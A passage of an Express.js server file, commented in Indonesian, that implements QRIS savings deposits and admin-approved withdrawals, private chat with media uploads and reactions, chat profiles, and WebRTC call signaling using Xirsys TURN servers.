app.get('/api/savings/config', (req, res) => {
  const auth = savingsAuth(req, res); if (!auth) return;
  res.json({
    valid: true,
    minDeposit: SAVINGS_MIN_DEPOSIT,
    maxDeposit: SAVINGS_MAX_DEPOSIT,
    minWithdraw: SAVINGS_MIN_WITHDRAW,
    currency: 'IDR'
  });
});

app.post('/api/savings/deposit/create', async (req, res) => {
  const auth = savingsAuth(req, res); if (!auth) return;
  const amount = Math.floor(Number(req.body?.amount));
  if (!Number.isFinite(amount) || amount < SAVINGS_MIN_DEPOSIT || amount > SAVINGS_MAX_DEPOSIT) {
    return res.status(400).json({ valid: false, message: `Nominal deposit Rp${SAVINGS_MIN_DEPOSIT.toLocaleString('id-ID')} - Rp${SAVINGS_MAX_DEPOSIT.toLocaleString('id-ID')}` });
  }
  if (!OPIPAY_API_KEY) return res.status(503).json({ valid: false, message: 'OPIPAY_API_KEY belum diisi di .env server' });

  const externalId = `SAV-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
  try {
    const r = await axios.post(`${OPIPAY_BASE_URL}/api/qris/create`, {
      amount, external_id: externalId
    }, {
      headers: { 'Content-Type': 'application/json', 'X-API-KEY': OPIPAY_API_KEY },
      timeout: 15000
    });
    if (!r.data?.success || !r.data?.data) {
      return res.status(502).json({ valid: false, message: 'OpiPay gagal membuat QRIS', provider: r.data });
    }
    const p = r.data.data;
    savingsAddTx(auth.user, {
      id: externalId, type: 'deposit', amount,
      status: 'pending', title: 'Deposit QRIS',
      description: `Menunggu pembayaran Rp${Number(p.total_amount || amount).toLocaleString('id-ID')}`,
      provider: 'opipay', externalId,
      baseAmount: Number(p.base_amount || amount),
      totalAmount: Number(p.total_amount || amount),
      uniqueCode: Number(p.unique_code || 0),
      feeAmount: Number(p.fee_amount || 0),
      qrUrl: p.qr_url,
      expiryAt: p.expiry_at || null
    });
    saveDatabase(auth.db);
    return res.json({ valid: true, transaction: savingsTransactions(auth.user)[0] });
  } catch (e) {
    console.error('[SAVINGS][OPIPAY CREATE]', e.response?.data || e.message);
    return res.status(502).json({ valid: false, message: 'Gagal terhubung ke OpiPay' });
  }
});

app.post('/api/savings/deposit/status', async (req, res) => {
  const auth = savingsAuth(req, res); if (!auth) return;
  const id = String(req.body?.transaction_id || '').trim();
  const tx = savingsTransactions(auth.user).find(t => t.id === id && t.type === 'deposit');
  if (!tx) return res.status(404).json({ valid: false, message: 'Transaksi tidak ditemukan' });
  if (tx.status === 'success') return res.json({ valid: true, transaction: tx, savings: savingsPublic(auth.user) });
  if (tx.status !== 'pending') return res.json({ valid: true, transaction: tx, savings: savingsPublic(auth.user) });
  if (!OPIPAY_API_KEY) return res.status(503).json({ valid: false, message: 'OPIPAY_API_KEY belum diisi di .env server' });

  try {
    const r = await axios.post(`${OPIPAY_BASE_URL}/api/qris/status`, {
      transaction_id: tx.externalId || tx.id
    }, {
      headers: { 'Content-Type': 'application/json', 'X-API-KEY': OPIPAY_API_KEY },
      timeout: 15000
    });
    const p = r.data?.data || {};
    const status = String(p.status || '').toLowerCase();
    if (status === 'success' || status === 'paid') {
      // Idempotent: only this branch can credit a pending transaction.
      const credit = Number(tx.baseAmount || tx.amount || 0);
      tx.status = 'success';
      tx.updatedAt = new Date().toISOString();
      tx.paidAt = p.paid_at || new Date().toISOString();
      tx.paymentMethod = p.payment_method || 'QRIS';
      tx.description = `Deposit berhasil Rp${credit.toLocaleString('id-ID')}`;
      auth.user.savings.balance = Number(auth.user.savings.balance || 0) + credit;
      auth.user.savings.totalDeposited = Number(auth.user.savings.totalDeposited || 0) + credit;
      saveDatabase(auth.db);
    } else if (status === 'expired' || status === 'failed') {
      tx.status = status;
      tx.updatedAt = new Date().toISOString();
      saveDatabase(auth.db);
    }
    return res.json({ valid: true, transaction: tx, savings: savingsPublic(auth.user), providerStatus: p.status || 'Pending' });
  } catch (e) {
    console.error('[SAVINGS][OPIPAY STATUS]', e.response?.data || e.message);
    return res.status(502).json({ valid: false, message: 'Gagal mengecek status pembayaran' });
  }
});

app.post('/api/savings/withdraw', (req, res) => {
  const auth = savingsAuth(req, res); if (!auth) return;
  const amount = Math.floor(Number(req.body?.amount));
  const destination = String(req.body?.destination || '').trim().replace(/[^0-9]/g, '').slice(0, 20);
  const ownerName = String(req.body?.owner_name || '').trim().slice(0, 80);
  const withdrawMethod = String(req.body?.withdraw_method || '').trim().toUpperCase();
  const allowedWithdrawMethods = ['DANA', 'GOPAY'];
  if (!allowedWithdrawMethods.includes(withdrawMethod)) {
    return res.status(400).json({ valid: false, message: 'Metode penarikan hanya DANA atau GoPay' });
  }
  if (!Number.isFinite(amount) || amount < SAVINGS_MIN_WITHDRAW) {
    return res.status(400).json({ valid: false, message: `Minimal penarikan Rp${SAVINGS_MIN_WITHDRAW.toLocaleString('id-ID')}` });
  }
  if (!destination) return res.status(400).json({ valid: false, message: `Nomor ${withdrawMethod} tujuan wajib diisi` });
  if (destination.length < 8 || destination.length > 15) return res.status(400).json({ valid: false, message: `Nomor ${withdrawMethod} tidak valid` });
  const balance = Number(auth.user.savings.balance || 0);
  if (amount > balance) return res.status(400).json({ valid: false, message: 'Saldo tabungan tidak mencukupi' });

  const existing = savingsTransactions(auth.user).find(t => t.type === 'withdraw' && t.status === 'pending');
  if (existing) return res.status(409).json({ valid: false, message: 'Masih ada penarikan yang sedang diproses' });

  const id = `WD-${Date.now()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
  // Reserve funds immediately so the same balance cannot be withdrawn twice.
  auth.user.savings.balance = balance - amount;
  savingsAddTx(auth.user, {
    id, type: 'withdraw', amount, status: 'pending',
    title: 'Penarikan Tabungan',
    description: `Menunggu persetujuan admin • ${withdrawMethod}`,
    withdrawMethod, destination, ownerName
  });
  saveDatabase(auth.db);
  res.json({ valid: true, transaction: savingsTransactions(auth.user)[0], savings: savingsPublic(auth.user) });
});

app.get('/api/savings/admin/withdrawals', (req, res) => {
  const auth = savingsAuth(req, res); if (!auth) return;
  if (!['owner','admin','developer'].includes(String(auth.user.role || '').toLowerCase()))
    return res.status(403).json({ valid: false, message: 'Akses admin diperlukan' });
  const db = loadDatabase(), rows = [];
  for (const u of db) for (const tx of savingsTransactions(savingsUser(db, u.username) || u))
    if (tx.type === 'withdraw' && tx.status === 'pending') rows.push({ username: u.username, withdrawMethod: tx.withdrawMethod || 'DANA', ...tx });
  res.json({ valid: true, withdrawals: rows });
});

app.post('/api/savings/admin/withdrawals/decision', (req, res) => {
  const auth = savingsAuth(req, res); if (!auth) return;
  if (!['owner','admin','developer'].includes(String(auth.user.role || '').toLowerCase()))
    return res.status(403).json({ valid: false, message: 'Akses admin diperlukan' });
  const username = String(req.body?.username || '').trim();
  const id = String(req.body?.transaction_id || '').trim();
  const decision = String(req.body?.decision || '').toLowerCase();
  const db = loadDatabase(), user = savingsUser(db, username);
  if (!user) return res.status(404).json({ valid: false, message: 'User tidak ditemukan' });
  const tx = savingsTransactions(user).find(t => t.id === id && t.type === 'withdraw');
  if (!tx) return res.status(404).json({ valid: false, message: 'Penarikan tidak ditemukan' });
  if (tx.status !== 'pending') return res.status(409).json({ valid: false, message: 'Transaksi sudah diproses' });

  if (decision === 'approve') {
    tx.status = 'success';
    tx.title = 'Penarikan Berhasil';
    tx.description = 'Penarikan disetujui admin';
    user.savings.totalWithdrawn = Number(user.savings.totalWithdrawn || 0) + Number(tx.amount || 0);
  } else if (decision === 'reject') {
    tx.status = 'rejected';
    tx.title = 'Penarikan Ditolak';
    tx.description = 'Saldo dikembalikan karena penarikan ditolak';
    user.savings.balance = Number(user.savings.balance || 0) + Number(tx.amount || 0);
  } else return res.status(400).json({ valid: false, message: 'decision harus approve/reject' });

  tx.updatedAt = new Date().toISOString();
  tx.processedBy = auth.user.username;
  saveDatabase(db);
  res.json({ valid: true, transaction: tx, savings: savingsPublic(user) });
});


function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

// ========== PRIVATE CHAT (DARG) ==========
const PRIVATE_CHAT_DIR = path.join(__dirname, 'private_chat_uploads');
if (!fs.existsSync(PRIVATE_CHAT_DIR)) fs.mkdirSync(PRIVATE_CHAT_DIR, { recursive: true });
app.use('/private_chat_uploads', express.static(PRIVATE_CHAT_DIR, {
  maxAge: '1d',
  setHeaders: (res, filePath) => {
    const ext = path.extname(filePath).toLowerCase();
    if (ext === '.wav') res.setHeader('Content-Type', 'audio/wav');
    else if (ext === '.m4a') res.setHeader('Content-Type', 'audio/mp4');
    else if (ext === '.mp3') res.setHeader('Content-Type', 'audio/mpeg');
    else if (ext === '.mp4') res.setHeader('Content-Type', 'video/mp4');
    res.setHeader('Content-Disposition', 'inline');
  }
}));

const privateStorage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, PRIVATE_CHAT_DIR),
  filename: (_req, file, cb) => {
    const ext = path.extname(file.originalname || '').toLowerCase() || '.bin';
    cb(null, `${Date.now()}-${crypto.randomBytes(10).toString('hex')}${ext}`);
  }
});
const privateUpload = multer({
  storage: privateStorage,
  limits: { fileSize: 150 * 1024 * 1024 }
});

function privateUserFromKey(key) {
  const info = activeKeys[String(key || '').trim()];
  if (!info) return null;
  if (info.expires && Date.now() > info.expires) { delete activeKeys[key]; return null; }
  return info.username;
}
function privateUserExists(username) {
  return loadDatabase().some(u => u && u.username === username);
}
function privateClean(input) {
  return String(input ?? '').replace(/[<>]/g, '').replace(/[\r\n]/g, ' ').trim().slice(0, 4000);
}


// ========== CHAT PROFILE ========== 
const CHAT_PROFILE_DIR = path.join(__dirname, 'chat_profiles');
if (!fs.existsSync(CHAT_PROFILE_DIR)) fs.mkdirSync(CHAT_PROFILE_DIR, { recursive: true });
app.use('/chat_profiles', express.static(CHAT_PROFILE_DIR, { maxAge: '1d' }));
const profileStorage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, CHAT_PROFILE_DIR),
  filename: (req, file, cb) => {
    const username = String(req.body?.username || 'user').replace(/[^a-zA-Z0-9_-]/g, '_');
    const ext = path.extname(file.originalname || '').toLowerCase() || '.jpg';
    cb(null, `${username}-${Date.now()}${ext}`);
  }
});
const profileUpload = multer({
  storage: profileStorage,
  limits: { fileSize: 8 * 1024 * 1024 },
  fileFilter: (_req, file, cb) => cb(null, /^image\//i.test(file.mimetype))
});
function chatProfileRoleAllowed(_role) {
  // Semua akun boleh mengubah profil chat mereka sendiri. Password tidak pernah
  // dikirim oleh endpoint profil publik/chat.
  return true;
}
function profileForUser(u) {
  const p = u?.chat_profile || {};
  // Public chat profile: safe identity/account metadata only.
  // NEVER expose password, session key, API key, or other secrets.
  return {
    username: u?.username || '',
    role: u?.role || 'member',
    display_name: p.display_name || u?.username || '',
    about: p.about || '',
    avatar_url: p.avatar_url || '',
    created_at: u?.createdAt || u?.created_at || null,
    expired_date: u?.expiredDate || u?.expired_date || null
  };
}
app.get('/api/chat/profile', (req, res) => {
  const key = String(req.query.session_key || req.query.key || '').trim();
  const info = activeKeys[key];
  if (!info) return res.status(401).json({valid:false,message:'Invalid session key'});
  const db = loadDatabase();
  const u = db.find(x => x && x.username === info.username);
  if (!u) return res.status(404).json({valid:false,message:'User tidak ditemukan'});
  return res.json({valid:true, editable:chatProfileRoleAllowed(u.role), profile:profileForUser(u)});
});
app.post('/api/chat/profile', profileUpload.single('avatar'), (req, res) => {
  const key = String(req.body?.session_key || req.body?.key || '').trim();
  const info = activeKeys[key];
  if (!info) {
    if (req.file) try { fs.unlinkSync(req.file.path); } catch (_) {}
    return res.status(401).json({valid:false,message:'Invalid session key'});
  }
  const db = loadDatabase();
  const u = db.find(x => x && x.username === info.username);
  if (!u) {
    if (req.file) try { fs.unlinkSync(req.file.path); } catch (_) {}
    return res.status(404).json({valid:false,message:'User tidak ditemukan'});
  }
  if (!chatProfileRoleAllowed(u.role)) {
    if (req.file) try { fs.unlinkSync(req.file.path); } catch (_) {}
    return res.status(403).json({valid:false,message:'Ganti profil hanya tersedia untuk reseller ke atas'});
  }
  u.chat_profile = u.chat_profile || {};
  if (req.body?.display_name != null) {
    u.chat_profile.display_name = String(req.body.display_name).replace(/[<>]/g,'').replace(/[\r\n]/g,' ').trim().slice(0,40) || u.username;
  }
  if (req.body?.about != null) {
    u.chat_profile.about = String(req.body.about).replace(/[<>]/g,'').replace(/[\r\n]/g,' ').trim().slice(0,120);
  }
  if (req.file) {
    u.chat_profile.avatar_url = `${req.protocol}://${req.get('host')}/chat_profiles/${encodeURIComponent(req.file.filename)}`;
  }
  saveDatabase(db);
  return res.json({valid:true,editable:true,profile:profileForUser(u)});
});

app.get('/api/chat/profile/user', (req, res) => {
  const key = String(req.query.session_key || req.query.key || '').trim();
  const info = activeKeys[key];
  if (!info) return res.status(401).json({valid:false,message:'Invalid session key'});
  const username = String(req.query.username || '').trim();
  if (!username) return res.status(400).json({valid:false,message:'Username wajib diisi'});
  const db = loadDatabase();
  const u = db.find(x => x && x.username === username);
  if (!u) return res.status(404).json({valid:false,message:'User tidak ditemukan'});
  // Sengaja hanya expose data profil chat. Password/session key/secret tidak pernah ikut.
  return res.json({valid:true,profile:profileForUser(u)});
});

app.get('/api/chat/private/users', (req, res) => {
  const me = privateUserFromKey(req.query.session_key || req.query.key);
  if (!me) return res.status(401).json({ valid:false, message:'Invalid session key' });
  const db = loadDatabase();
  const users = db.filter(u => u && u.username).map(u => ({
    username: u.username,
    role: u.role || 'member',
    expiredDate: u.expiredDate || null,
    online: !!privateSockets[u.username],
    avatar_url: u.chat_profile?.avatar_url || '',
    display_name: u.chat_profile?.display_name || u.username,
    about: u.chat_profile?.about || ''
  }));
  res.json({ valid:true, users });
});

app.get('/api/chat/private/messages', (req, res) => {
  const me = privateUserFromKey(req.query.session_key || req.query.key);
  const other = String(req.query.with || '').trim();
  if (!me) return res.status(401).json({ valid:false, message:'Invalid session key' });
  if (!privateUserExists(other) || other === me) return res.status(404).json({ valid:false, message:'User tidak ditemukan' });
  const messages = chatList.filter(m => m && m.chat_type === 'private' && ((m.from===me && m.to===other)||(m.from===other && m.to===me))).map(m => ({...m, fromMe:m.from===me}));
  res.json({ valid:true, with:other, messages });
});

app.post('/api/chat/private/send', (req, res) => {
  const me = privateUserFromKey(req.body?.session_key || req.body?.key);
  const to = String(req.body?.to || '').trim();
  const message = privateClean(req.body?.message);
  if (!me) return res.status(401).json({ valid:false, message:'Invalid session key' });
  if (!privateUserExists(to) || to===me) return res.status(404).json({ valid:false, message:'User tujuan tidak ditemukan' });
  if (!message) return res.status(400).json({ valid:false, message:'Message cannot be empty' });
  const now = new Date().toISOString();
  const replyTo = String(req.body?.reply_to || '').trim();
  let replyPreview = null;
  if (replyTo) {
    const source = chatList.find(m => m && String(m.id || '') === replyTo && m.chat_type === 'private');
    if (source && (source.from === me || source.to === me) && (source.from === to || source.to === to)) {
      replyPreview = { id: source.id, from: source.from, message: privateClean(source.message || source.file_name || 'Media').slice(0, 180), media_type: source.media_type || 'text' };
    }
  }
  const chat = { id:crypto.randomBytes(12).toString('hex'), chat_type:'private', from:me, to, message, media_type:'text', time:now, created_at:now, read:false, reactions:{}, ...(replyPreview ? {reply_to: replyTo, reply_preview: replyPreview} : {}) };
  chatList.push(chat); if (chatList.length>5000) chatList=chatList.slice(-5000); saveChat();
  const payload={...chat,fromMe:false};
  if (privateSockets[to]) privateSockets[to].emit('private:message',{message:payload});
  return res.json({valid:true,status:'sent',message:{...chat,fromMe:true}});
});

app.post('/api/chat/private/upload', privateUpload.single('media'), (req, res) => {
  const me = privateUserFromKey(req.body?.session_key || req.body?.key);
  const to = String(req.body?.to || '').trim();
  if (!me) { if(req.file)try{fs.unlinkSync(req.file.path)}catch(_){}; return res.status(401).json({valid:false,message:'Invalid session key'}); }
  if (!privateUserExists(to) || to===me) { if(req.file)try{fs.unlinkSync(req.file.path)}catch(_){}; return res.status(404).json({valid:false,message:'User tujuan tidak ditemukan'}); }
  if (!req.file) return res.status(400).json({valid:false,message:'Media wajib diupload'});
  const allowed = new Set(['image','video','audio','file']);
  const mediaType = allowed.has(req.body.media_type) ? req.body.media_type : (req.file.mimetype.startsWith('image/')?'image':req.file.mimetype.startsWith('video/')?'video':req.file.mimetype.startsWith('audio/')?'audio':'file');
  const now=new Date().toISOString();
  const media_url=`${req.protocol}://${req.get('host')}/private_chat_uploads/${encodeURIComponent(req.file.filename)}`;
  const chat={id:crypto.randomBytes(12).toString('hex'),chat_type:'private',from:me,to,message:req.file.originalname||'Media',media_type:mediaType,file_name:req.file.originalname||req.file.filename,file_size:req.file.size,mime_type:req.file.mimetype,media_url,time:now,created_at:now,read:false};
  chatList.push(chat); if(chatList.length>5000)chatList=chatList.slice(-5000); saveChat();
  if(privateSockets[to])privateSockets[to].emit('private:message',{message:{...chat,fromMe:false}});
  return res.json({valid:true,status:'sent',message:{...chat,fromMe:true}});
});


app.post('/api/chat/private/reaction', (req,res) => {
  const me=privateUserFromKey(req.body?.session_key || req.body?.key);
  const id=String(req.body?.id||'').trim();
  const reaction=String(req.body?.reaction||'').trim();
  if(!me)return res.status(401).json({valid:false,message:'Invalid session key'});
  if(!id)return res.status(400).json({valid:false,message:'ID pesan wajib diisi'});
  const allowed=['❤️','😂','👍','😮','😢','🔥'];
  if(reaction && !allowed.includes(reaction))return res.status(400).json({valid:false,message:'Reaction tidak didukung'});
  const m=chatList.find(x=>x&&x.chat_type==='private'&&String(x.id||'')===id);
  if(!m || (m.from!==me && m.to!==me))return res.status(404).json({valid:false,message:'Pesan tidak ditemukan'});
  m.reactions=m.reactions&&typeof m.reactions==='object'?m.reactions:{};
  if(!reaction || m.reactions[me]===reaction) delete m.reactions[me]; else m.reactions[me]=reaction;
  m.reaction_updated_at=new Date().toISOString(); saveChat();
  emitPrivate(m.from,'private:message:reaction',{message:{...m,fromMe:false}});
  if(m.to!==m.from) emitPrivate(m.to,'private:message:reaction',{message:{...m,fromMe:false}});
  return res.json({valid:true,id,reactions:m.reactions});
});

app.post('/api/chat/private/forward', (req,res) => {
  const me=privateUserFromKey(req.body?.session_key || req.body?.key);
  const id=String(req.body?.id||'').trim();
  const to=String(req.body?.to||'').trim();
  if(!me)return res.status(401).json({valid:false,message:'Invalid session key'});
  if(!privateUserExists(to) || to===me)return res.status(404).json({valid:false,message:'User tujuan tidak ditemukan'});
  const source=chatList.find(x=>x&&x.chat_type==='private'&&String(x.id||'')===id&&(x.from===me||x.to===me));
  if(!source)return res.status(404).json({valid:false,message:'Pesan tidak ditemukan'});
  const now=new Date().toISOString();
  const chat={id:crypto.randomBytes(12).toString('hex'),chat_type:'private',from:me,to,message:source.message||source.file_name||'Media',media_type:source.media_type||'text',file_name:source.file_name, file_size:source.file_size, mime_type:source.mime_type, media_url:source.media_url,time:now,created_at:now,read:false,forwarded:true,forwarded_from:source.from};
  chatList.push(chat); if(chatList.length>5000)chatList=chatList.slice(-5000); saveChat();
  emitPrivate(to,'private:message',{message:{...chat,fromMe:false}});
  return res.json({valid:true,status:'sent',message:{...chat,fromMe:true}});
});

app.post('/api/chat/private/edit', (req,res) => {
  const me=privateUserFromKey(req.body?.session_key || req.body?.key);
  const id=String(req.body?.id||'').trim();
  if(!me)return res.status(401).json({valid:false,message:'Invalid session key'});
  const idx=chatList.findIndex(m=>m&&m.chat_type==='private'&&String(m.id||'')===id);
  if(idx<0)return res.status(404).json({valid:false,message:'Pesan tidak ditemukan'});
  const m=chatList[idx];
  if(m.from!==me)return res.status(403).json({valid:false,message:'Tidak boleh mengedit pesan ini'});
  if((m.media_type||'text')!=='text')return res.status(400).json({valid:false,message:'Media tidak bisa diedit'});
  const message=privateClean(req.body?.message);
  if(!message)return res.status(400).json({valid:false,message:'Pesan kosong'});
  m.message=message;m.edited=true;m.edited_at=new Date().toISOString();saveChat();
  emitPrivate(m.to,'private:message:edited',{message:{...m,fromMe:false}});
  return res.json({valid:true,message:{...m,fromMe:true}});
});
app.post('/api/chat/private/delete', (req,res) => {
  const me=privateUserFromKey(req.body?.session_key || req.body?.key);
  const id=String(req.body?.id||'').trim();
  if(!me)return res.status(401).json({valid:false,message:'Invalid session key'});
  const idx=chatList.findIndex(m=>m&&m.chat_type==='private'&&String(m.id||'')===id);
  if(idx<0)return res.status(404).json({valid:false,message:'Pesan tidak ditemukan'});
  const m=chatList[idx];
  if(m.from!==me)return res.status(403).json({valid:false,message:'Tidak boleh menghapus pesan ini'});
  chatList.splice(idx,1);
  if (m.media_url && m.media_url.includes('/private_chat_uploads/')) { try { const f=path.join(PRIVATE_CHAT_DIR, path.basename(new URL(m.media_url).pathname)); if (fs.existsSync(f)) fs.unlinkSync(f); } catch (_) {} }
  saveChat();
  emitPrivate(m.to,'private:message:deleted',{id:m.id});
  return res.json({valid:true,id:m.id});
});

app.post('/api/chat/private/read', (req,res)=>{
  const me=privateUserFromKey(req.body?.session_key || req.body?.key); const other=String(req.body?.with||'').trim();
  if(!me)return res.status(401).json({valid:false,message:'Invalid session key'});
  let changed=false; chatList=chatList.map(m=>{if(m&&m.chat_type==='private'&&m.from===other&&m.to===me&&!m.read){changed=true;return {...m,read:true}}return m}); if(changed)saveChat(); res.json({valid:true});
});

// Socket.IO channel khusus private chat + WebRTC signaling.
const privateSockets = {};
const privateSocketSets = {};
const privateCalls = new Map();
// ICE candidates can arrive while the callee is still looking at the incoming-call dialog.
// Buffer them per call so early candidates are not lost.
const privateCallIce = new Map();
const privateCallAnswered = new Set();

// WebRTC ICE config. Xirsys is the preferred managed TURN provider.
// Keep Xirsys credentials on the API server; never ship the secret in the APK.
// Fallback to manually supplied TURN_* env vars if Xirsys is not configured.
let xirsysIceCache = { expiresAt: 0, servers: [] };

async function getXirsysIceServers() {
  const pathUrl = String(process.env.XIRSYS_PATH || '').trim().replace(/\/$/, '');
  const ident = String(process.env.XIRSYS_IDENT || '').trim();
  const secret = String(process.env.XIRSYS_SECRET || '').trim();
  const channel = String(process.env.XIRSYS_CHANNEL || '').trim();
  if (!pathUrl || !ident || !secret || !channel) return [];

  if (xirsysIceCache.expiresAt > Date.now() && xirsysIceCache.servers.length) {
    return xirsysIceCache.servers;
  }

  const auth = Buffer.from(`${ident}:${secret}`).toString('base64');
  const url = `${pathUrl}/_turn/${channel.split('/').map(encodeURIComponent).join('/')}?expire=3600`;

  // Xirsys' current API expects the format selector in the JSON body.
  // The older implementation put ?format=urls in the query string and sent
  // a null body; that can return an unexpected envelope and leave the APK
  // with an empty TURN list.
  const response = await axios.put(url, { format: 'urls' }, {
    headers: {
      Authorization: `Basic ${auth}`,
      Accept: 'application/json',
      'Content-Type': 'application/json'
    },
    timeout: 10000,
    validateStatus: () => true
  });

  if (response.status < 200 || response.status >= 300) {
    throw new Error(`Xirsys HTTP ${response.status}`);
  }

  const data = typeof response.data === 'string' ? JSON.parse(response.data) : response.data;
  if (!data || data.s !== 'ok') {
    throw new Error(`Xirsys response not ok${data?.s ? ` (${data.s})` : ''}`);
  }

  // format=urls returns one object:
  // { v: { iceServers: { username, credential, urls: [...] } }, s: 'ok' }
  // WebRTC expects an array of ICE-server objects, so normalize it here.
  const raw = data?.v?.iceServers ?? data?.iceServers ?? [];
  const entries = Array.isArray(raw) ? raw : [raw];
  const normalized = [];

  for (const item of entries) {
    if (!item || typeof item !== 'object') continue;
    const urls = item.urls || item.url;
    if (!urls) continue;
    const entry = {
      urls: Array.isArray(urls) ? urls : [urls]
    };
    if (item.username) entry.username = item.username;
    if (item.credential) entry.credential = item.credential;
    normalized.push(entry);
  }

  if (!normalized.length) throw new Error('Xirsys returned no ICE servers');

  xirsysIceCache = { expiresAt: Date.now() + 5 * 60 * 1000, servers: normalized };
  console.log(`[XIRSYS] ICE ready: ${normalized.length} server object(s), ${normalized.reduce((n, s) => n + s.urls.length, 0)} URL(s)`);
  return normalized;
}

app.get('/api/chat/private/ice/status', (req, res) => {
  const configured = ['XIRSYS_PATH','XIRSYS_IDENT','XIRSYS_SECRET','XIRSYS_CHANNEL'].every(k => String(process.env[k] || '').trim());
  res.json({valid:true, xirsysConfigured:configured, cachedTurn: xirsysIceCache.servers.length > 0 && xirsysIceCache.expiresAt > Date.now(), cacheExpiresAt:xirsysIceCache.expiresAt || null});
});

app.get('/api/chat/private/ice', async (req, res) => {
  const me = privateUserFromKey(req.query.session_key || req.query.key);
  if (!me) return res.status(401).json({valid:false, message:'Invalid session key'});

  const servers = [];
  try {
    const xirsys = await getXirsysIceServers();
    servers.push(...xirsys);
  } catch (err) {
    console.error('[XIRSYS] ICE request failed:', err?.message || err);
  }

  const turnUrl = String(process.env.TURN_URL || '').trim();
  const turnUser = String(process.env.TURN_USERNAME || '').trim();
  const turnCredential = String(process.env.TURN_CREDENTIAL || '').trim();
  if (!servers.some(s => String(s.urls || '').toLowerCase().startsWith('turn')) && turnUrl && turnUser && turnCredential) {
    servers.push({urls:turnUrl, username:turnUser, credential:turnCredential});
  }

  const hasTurn = servers.some(s => String(s.urls || '').toLowerCase().startsWith('turn:') || String(s.urls || '').toLowerCase().startsWith('turns:'));
  const relayOnly = String(req.query.relay_only || '') === '1';
  const xirsysAvailable = servers.some(s => (Array.isArray(s.urls) ? s.urls : [s.urls]).some(u => /^turns?:/i.test(String(u))));

  // When relay_only=1 is requested by the call client, return only TURN/TURNS
  // entries. This avoids a false-positive "connected" call where signaling works
  // but the peers cannot establish a media path through their mobile NATs.
  const output = relayOnly && hasTurn
    ? servers.map(s => ({...s, urls: (Array.isArray(s.urls) ? s.urls : [s.urls]).filter(u => {
        const x=String(u).toLowerCase();
        return x.startsWith('turn:') || x.startsWith('turns:');
      })})).filter(s => s.urls.length)
    : servers;

  if (!relayOnly) {
    output.push(
      {urls:'stun:stun.l.google.com:19302'},
      {urls:'stun:stun1.l.google.com:19302'},
      {urls:'stun:stun2.l.google.com:19302'}
    );
  }

  if (relayOnly && output.length === 0) {
    return res.status(503).json({valid:false, message:'TURN server belum tersedia'});
  }

  res.json({valid:true, relayOnly:relayOnly && hasTurn, iceServers:output, source: xirsysAvailable ? 'xirsys' : (hasTurn ? 'turn_fallback' : 'stun_fallback'), turnAvailable: hasTurn});
});

function emitPrivate(to, event, payload) {
  const set = privateSocketSets[to];
  if (set && set.size) { for (const s of set) s.emit(event, payload); return true; }
  if (privateSockets[to]) { privateSockets[to].emit(event, payload); return true; }
  return false;
}

io.on('connection', (socket) => {
  socket.on('private:auth', (data) => {
    const username = privateUserFromKey(data?.session_key || data?.key);
    if (!username) return socket.emit('private:auth:error',{message:'Unauthorized'});
    socket.data.privateUsername = username;
    privateSockets[username] = socket;
    if (!privateSocketSets[username]) privateSocketSets[username] = new Set();
    privateSocketSets[username].add(socket);
    socket.emit('private:auth:ok',{username});
  });

  socket.on('private:call', (data) => {
    const from = socket.data.privateUsername;
    const to = String(data?.to || '').trim();
    const callId = String(data?.callId || '').trim();
    if (!from || !callId || !privateUserExists(to)) return;
    if (!emitPrivate(to, 'private:call', {...data, from, callId})) {
      socket.emit('private:call:unavailable',{callId,to,message:'User sedang offline'});
      return;
    }
    const old = privateCalls.get(callId);
    if (old?.timer) clearTimeout(old.timer);
    const timer = setTimeout(() => {
      privateCalls.delete(callId);
      privateCallIce.delete(callId);
      privateCallAnswered.delete(callId);
      emitPrivate(from, 'private:call:timeout', {callId,to});
      emitPrivate(to, 'private:call:end', {callId,from});
    }, 60000);
    privateCalls.set(callId,{from,to,timer});
  });

  socket.on('private:call:answer', (data) => {
    const from = socket.data.privateUsername;
    const to = String(data?.to || '').trim();
    const callId = String(data?.callId || '').trim();
    if (!from || !to || !callId) return;

    emitPrivate(to, 'private:call:answer', {...data,from});

    // Replay only candidates whose destination is this socket's user.
    // The previous implementation replayed both directions back to the callee,
    // which could feed a device its own ICE candidates.
    const queued = privateCallIce.get(callId) || [];
    for (const candidate of queued) {
      if (String(candidate?.to || '') === from) socket.emit('private:call:ice', candidate);
    }
    privateCallIce.delete(callId);
    privateCallAnswered.add(callId);

    const call = privateCalls.get(callId);
    if (call?.timer) clearTimeout(call.timer);
    if (call) privateCalls.delete(callId);
  });

  socket.on('private:call:ice', (data) => {
    const from = socket.data.privateUsername;
    const to = String(data?.to || '').trim();
    const callId = String(data?.callId || '').trim();
    if (!from || !to || !callId || !data?.candidate) return;

    const payload = {...data,from};
    // Before the callee accepts, buffer candidates because its call page is not
    // listening yet. After answer, direct delivery is enough.
    if (!privateCallAnswered.has(callId)) {
      if (!privateCallIce.has(callId)) privateCallIce.set(callId, []);
      const queue = privateCallIce.get(callId);
      queue.push(payload);
      if (queue.length > 80) queue.shift();
    }

    // If the target is already inside the call page, deliver immediately too.
    emitPrivate(to,'private:call:ice',payload);
  });

  socket.on('private:call:end', (data) => {
    const from = socket.data.privateUsername;
    const to = String(data?.to || '').trim();
    const callId = String(data?.callId || '').trim();
    const call = privateCalls.get(callId);
    if (call?.timer) clearTimeout(call.timer);
    if (call) privateCalls.delete(callId);
    privateCallIce.delete(callId);
    privateCallAnswered.delete(callId);
    if (from && to) emitPrivate(to,'private:call:end',{...data,from});
  });

  socket.on('disconnect', () => {
    const username = socket.data.privateUsername;
    if (!username || !privateSocketSets[username]) return;
    privateSocketSets[username].delete(socket);
    if (privateSocketSets[username].size === 0) {
      delete privateSocketSets[username];
      if (privateSockets[username] === socket) delete privateSockets[username];
    } else if (privateSockets[username] === socket) {
      privateSockets[username] = [...privateSocketSets[username]][0];
    }
  });
});

// ========== GLOBAL CHAT MEDIA ========== 
const GLOBAL_CHAT_DIR = path.join(__dirname, 'global_chat_uploads');
